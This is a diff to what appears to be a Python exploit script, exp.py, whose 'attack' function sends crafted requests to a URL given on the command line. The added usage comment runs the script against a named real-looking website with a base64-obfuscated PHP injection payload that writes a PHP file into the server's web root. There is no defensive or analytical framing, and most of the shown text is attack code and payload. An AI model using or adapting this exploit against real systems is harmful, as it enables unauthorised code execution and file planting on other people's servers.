@@ -5,6 +5,11 @@ import sys
 url = sys.argv[1]
 command = sys.argv[2]
 
+"""
+python exp.py http://www.schafx.de/ fputs\(fopen\(base64_decode\(L3Zhci93d3cvaHRtbC9hLnBocA\),w\),base64_decode\(PD9waHAgcGhwaW5mbygpID8\)\)
+
+"""
+
 
 def attack(uid):
     headers = {
@@ -13,6 +18,7 @@ def attack(uid):
     s = requests.session()
     response = s.get(url='%s' % url, headers=headers)
     response = s.get(url='%s' % url)
+    # response = s.post(url='%s' % url,data='a=')
     info = response.content
     return info
 
